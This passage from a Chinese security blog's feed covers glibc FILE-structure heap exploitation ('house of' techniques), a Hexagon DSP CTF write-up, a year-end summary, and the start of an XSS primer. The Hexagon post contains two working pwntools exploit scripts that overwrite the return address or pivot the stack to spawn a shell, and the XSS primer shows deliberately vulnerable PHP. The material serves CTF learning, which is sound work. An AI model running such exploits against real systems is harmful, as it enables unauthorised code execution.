class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> </span><br><span class="line">file = &#123;</span><br><span class="line">    _flags = <span class="number">-72537977</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f6d399137e4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7f6d39912a80</span> &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = <span class="number">1</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7f6d39915730</span> &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f6d39912980</span> &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f6d39914560</span> &lt;__GI__IO_file_jumps&gt;</span><br></pre></td></tr></table></figure><p>有一个<code>_wide_data</code>结构体，之前分析调用的是<code>_wide_data</code>的<code>wide_vtable</code>里的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line"> _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _IO_last_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _codecvt = &#123;</span><br><span class="line">   __cd_in = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   __cd_out = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _shortbuf = <span class="string">L&quot;&quot;</span>,</span><br><span class="line"> _wide_vtable = <span class="number">0x7f6d39914020</span> &lt;__GI__IO_wfile_jumps&gt;</span><br></pre></td></tr></table></figure><p>因此有以下利用：</p><ul><li>将 <code>IO_FILE</code> 中的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps</code></li><li>将 <code>IO_FILE</code> 中的 <code>wide_data</code> 设置为可控堆地址，目的是控制 <code>wide_data</code> 中的 <code>write_base</code> 和 <code>buf_base</code> 为0</li><li>控制 <code>wide_data-&gt;wide_vtable</code> 为地址 <code>A</code>，地址 <code>A</code> 满足 <code>*(A+0x68) == system</code> （此处的 <code>system</code> 地址是自己布置的）</li></ul><p>总结下执行到最后的位置<strong>需要绕过的检查</strong></p><ol><li><code>_flags</code> 设置为<code>~(2 | 0x8 | 0x800)</code> ，如果是需要获取 <code>shell</code> 的话，那么可以将参数写为 <code>sh;</code> 这样 <code>_flags</code> 既能绕过检查，又能被 <code>system</code> 函数当做参数成功执行。需要注意的是 <code>sh;</code> 前面是有两个空格的（这个值是 <code>0x3b68732020</code> ）</li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code></li><li><code>fp-&gt;_mode == 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> ,这样即可触发 <code>_IO_OVERFLOW</code>。</li></ol><h3 id="相关技巧-20"><a href="#相关技巧-20" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>利用<code>_IO_wfile_overflow</code> 函数控制程序执行流时对 <code>fp</code> 的设置如下：</p><ul><li><code>_flags</code> 设置为 <code>~(2 | 0x8 | 0x800)</code>，如果不需要控制 <code>rdi</code>，设置为 <code>0</code> 即可；如果需要获得 <code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li><li><code>vtable</code> 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code> 即可</li><li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></li></ul><h3 id="利用效果-20"><a href="#利用效果-20" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-of手法&quot;&gt;&lt;a href=&quot;#house-of手法&quot; class=&quot;headerlink&quot; title=&quot;house of手法&quot;&gt;&lt;/a&gt;house of手法&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="house of" scheme="http://s1nec-1o.github.io/categories/house-of/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hexagon学习</title>
    <link href="http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/"/>
    <id>http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-02-13T07:36:57.000Z</published>
    <updated>2025-02-13T07:39:36.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexagon-学习"><a href="#Hexagon-学习" class="headerlink" title="Hexagon 学习"></a>Hexagon 学习</h1><p><strong>Hexagon</strong> 是高通（Qualcomm）开发的 <strong>数字信号处理器（DSP）</strong> 架构，专为移动设备、物联网和边缘计算设计，以高效能、低功耗为核心优势。它被集成在高通骁龙（Snapdragon）系列芯片中</p><ul><li>hexagon用<strong>allocframe</strong>开辟栈帧：LR压栈，FP压栈，SP减去一定数值向低地址开辟，FP设置成指向旧FP的指针。deallocframe&#x2F;dealloc_return用于销毁栈帧&#x2F;销毁栈帧并返回，从栈底取回FP和LR。</li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539009.png" alt="image-20250208213002824" style="zoom: 33%;" /><ul><li>一共有32个32位通用寄存器，r0-r31。存在寄存器对，可以当做64位寄存器使用，如r0和r1可以合并成r1:0</li><li>r29-r31是别名寄存器。r29是SP，r30是FP，r31是LR寄存器。SP是栈顶寄存器，FP是栈（底）寄存器，LR是储存返回地址的寄存器。</li></ul><p>看汇编感觉是类arm架构</p><p>主要的汇编有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocframe(#0x10) #开辟栈空间</span><br><span class="line">add(r0,#-0x10) #加减乘除，有返回值</span><br><span class="line">call func</span><br><span class="line">dealloc_return #pop and ret (类似pop，但是hexagon是么有pop滴)</span><br><span class="line">memw(r1) #取指针指向的内容</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="『2025VNCTF』hexagon"><a href="#『2025VNCTF』hexagon" class="headerlink" title="『2025VNCTF』hexagon"></a>『2025VNCTF』hexagon</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00020460</span>                 .global vuln</span><br><span class="line">.text:<span class="number">00020460</span> vuln:                                   <span class="comment">// CODE XREF: main+90↓p</span></span><br><span class="line">.text:<span class="number">00020460</span>                 &#123; <span class="built_in">allocframe</span>(#<span class="number">0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020464</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aD@pcrel) &#125; <span class="comment">// &quot;%d&quot;</span></span><br><span class="line">.text:<span class="number">0002046</span>C                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020470</span>                 &#123; call scanf &#125;</span><br><span class="line">.text:<span class="number">00020474</span>                 &#123; r0 = #<span class="number">0</span> &#125;             <span class="comment">// fd</span></span><br><span class="line">.text:<span class="number">00020478</span>                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-8</span>) &#125;   <span class="comment">// buf</span></span><br><span class="line">.text:<span class="number">0002047</span>C                 &#123; r2 = #<span class="number">0x10</span> &#125;          <span class="comment">// nbytes</span></span><br><span class="line">.text:<span class="number">00020480</span>                 &#123; call read &#125;</span><br><span class="line">.text:<span class="number">00020484</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aCatHomeCtfLog@pcrel) &#125; <span class="comment">// &quot;cat /home/ctf/log&quot;</span></span><br><span class="line">.text:<span class="number">0002048</span>C                 &#123; call system &#125;</span><br><span class="line">.text:<span class="number">00020490</span>                 &#123; nop</span><br><span class="line">.text:<span class="number">00020494</span>                   nop</span><br><span class="line">.text:<span class="number">00020498</span>                   nop</span><br><span class="line">.text:<span class="number">0002049</span>C                   dealloc_return &#125;</span><br><span class="line">.text:<span class="number">0002049</span>C <span class="comment">// End of function vuln</span></span><br></pre></td></tr></table></figure><p>发现allocframe只开辟了0x10个字节的栈空间，然后read的起始地址是从fp-8开始的，再结合32位的4字节地址，显然有栈溢出8个字节，溢出到FP和LR的存储空间，而LR是存取返回地址的，便有劫持返回地址。</p><h4 id="解法1-system执行"><a href="#解法1-system执行" class="headerlink" title="解法1-system执行"></a>解法1-system执行</h4><p>看了官方wp之后</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539011.png" alt="image-20250210142817772"></p><p>从libc.so中找到system，发现偏底层的system实现方式是通过posix_spawn进程创建函数（理解为fork+execve即可），通过对参数的简单分析，可以知道r1&#x3D;”&#x2F;bin&#x2F;sh”，然后argv[] &#x3D; {“sh”, “-c”, user_input, NULL};，而这个usr_input是通过fp-0x10输入的，详情自行查看posix_spawn的参数</p><p>然后回到题目发现一开始有一个scanf函数是输入fp-0x10的，那么局势就很明朗了，同时由于qemu的libc是不会改变的，因此传入一个&#x2F;bin&#x2F;sh的地址就行啦</p><p>libc地址的寻找：</p><p>这里是通过日志来寻找的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set_tid_address</span>(<span class="number">1073672412</span>,<span class="number">1073672412</span>,<span class="number">-4</span>,<span class="number">0</span>,<span class="number">1072439316</span>,<span class="number">67108864</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><p>而这个1073672412是指针地址，通常由libc分配的存储tid（线程id）的，从libc中寻找到对应的结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0012F</span>0DC __thread_list_lock:.space <span class="number">1</span>             <span class="comment">// DATA XREF: __init_tp+70↑o</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DC                                         <span class="comment">// __post_Fork+28↑o ...</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DD                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DE                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DF                 .space <span class="number">1</span></span><br></pre></td></tr></table></figure><p>相减获得libc_base&#x3D;0x3FEC0000（算是取巧吧，因为我的qemu单步执行坏掉啦&#x2F;(ㄒoㄒ)&#x2F;~~）</p><p>本地环境与远程有差距，不过方法类似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">process</span>([<span class="string">&#x27;qemu-hexagon&#x27;</span> , <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20420+0xc0&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">libc_base=<span class="number">0x40810000</span></span><br><span class="line">fp=<span class="number">0x4080f078</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"><span class="built_in">ru</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="built_in">sl</span>(<span class="built_in">tbs</span>(binsh))</span><br><span class="line">payload = <span class="built_in">p32</span>(<span class="number">0</span>)*<span class="number">2</span>+<span class="built_in">p32</span>(fp+<span class="number">8</span>)+<span class="built_in">p32</span>(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line"><span class="built_in">s</span>(payload)</span><br><span class="line"><span class="built_in">irt</span>()</span><br></pre></td></tr></table></figure><h4 id="解法2-栈迁移"><a href="#解法2-栈迁移" class="headerlink" title="解法2-栈迁移"></a>解法2-栈迁移</h4><p>对1血脚本学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>有意思的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexagon-学习&quot;&gt;&lt;a href=&quot;#Hexagon-学习&quot; class=&quot;headerlink&quot; title=&quot;Hexagon 学习&quot;&gt;&lt;/a&gt;Hexagon 学习&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Hexagon&lt;/strong&gt; 是高通（Qualcomm）</summary>
      
    
    
    
    <category term="hexagon-pwn" scheme="http://s1nec-1o.github.io/categories/hexagon-pwn/"/>
    
    
    <category term="hexagon" scheme="http://s1nec-1o.github.io/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-02-01T08:50:35.000Z</published>
    <updated>2025-02-01T09:01:57.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024年终总结"><a href="#2024年终总结" class="headerlink" title="2024年终总结"></a>2024年终总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次写年终总结呢，一年过的好快，大一小登-&gt;大二老登，感觉下半年有点摆烂（，主要还是对IoT领域的不了解，以及自身能力的缺陷，希望明年能加以改进，在此写下2024年的收获与对2025的希冀</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>获得了第一枚CVE，从0到1的突破！！</li><li>获得了ciscn华东南分区的二等奖</li><li>结识了许多伙伴</li></ol><p>能说的上号的也就这几个🥲，但最珍贵的还是心态上的转变以及对自我的清晰认知</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol><li>获取大厂类似思科，华为，华硕等的各一枚CVE</li><li>补足Web安全的知识</li><li>获得几个比赛的奖项（Pwn！！！）</li><li>硬件安全</li><li>无线电安全</li><li>最后，希望能挖到一枚未授权RCE</li></ol><p>希望 2025的我 万事胜意！天天开心！努力学习！天天向上！哦耶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024年终总结&quot;&gt;&lt;a href=&quot;#2024年终总结&quot; class=&quot;headerlink&quot; title=&quot;2024年终总结&quot;&gt;&lt;/a&gt;2024年终总结&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="2024年终总结" scheme="http://s1nec-1o.github.io/categories/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="年终总结" scheme="http://s1nec-1o.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>初探XSS</title>
    <link href="http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/"/>
    <id>http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/</id>
    <published>2025-01-23T06:06:48.000Z</published>
    <updated>2025-01-23T06:17:01.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS学习"><a href="#XSS学习" class="headerlink" title="XSS学习"></a>XSS学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在IoT设备中，也有遇到过XSS的情况，在此学习ing</p><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果</p><h2 id="函数类"><a href="#函数类" class="headerlink" 